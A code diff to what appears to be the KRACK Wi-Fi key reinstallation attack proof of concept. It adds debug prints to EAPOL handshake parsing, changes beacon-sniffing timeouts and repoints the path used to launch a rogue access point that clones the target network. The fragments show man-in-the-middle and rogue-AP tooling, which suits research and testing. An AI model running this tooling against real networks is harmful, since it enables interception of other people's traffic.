@@ -68,7 +68,6 @@ def log(level, msg, color=None, showtime=True):
     print((datetime.now().strftime('[%H:%M:%S] ') if showtime else " " * 11) + COLORCODES.get(color,
                                                                                               "") + msg + "\033[1;0m")
 
-
 #### Packet Processing Functions ####
 
 class MitmSocket(L2Socket):
@@ -211,6 +210,9 @@ def get_eapol_msgnum(p):
     FLAG_SECURE = 0b1000000000
 
     if not EAPOL in p: return 0
+
+    print("TESTPRINT_1: ", type(p), type(p[EAPOL]), p[EAPOL], len(p[EAPOL]))
+    print("TESTPRINT_2: ", type(str(p[EAPOL])),  str(p[EAPOL]), type(bytes(p[EAPOL])), bytes(p[EAPOL]))
 
     keyinfo = bytes(p[EAPOL])[5:7]
     flags = struct.unpack(">H", keyinfo)[0]
@@ -539,7 +541,7 @@ class KRAckAttack():
 
     def find_beacon(self, ssid):
         beacon_p = None
-        ps = sniff(count=3, timeout=0.3,
+        ps = sniff(count=3, timeout=0.5,
                    lfilter=lambda p: Dot11Beacon in p,
                    opened_socket=self.sock_real)
         for p in ps:
@@ -551,7 +553,7 @@ class KRAckAttack():
             for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
                 self.sock_real.set_channel(chan)
                 log(DEBUG, "Listening on channel %d" % chan)
-                ps = sniff(count=3, timeout=0.3,
+                ps = sniff(count=3, timeout=0.1,
                    lfilter=lambda p: Dot11Beacon in p,
                    opened_socket=self.sock_real)
                 for p in ps:
@@ -985,7 +987,7 @@ class KRAckAttack():
         # Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
         with open("hostapd_rogue.conf", "w") as fp:
             fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-        self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"],
+        self.hostapd = subprocess.Popen(["../hostap-ct/hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"],
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         self.hostapd_log = open("hostapd_rogue.log", "w")
 
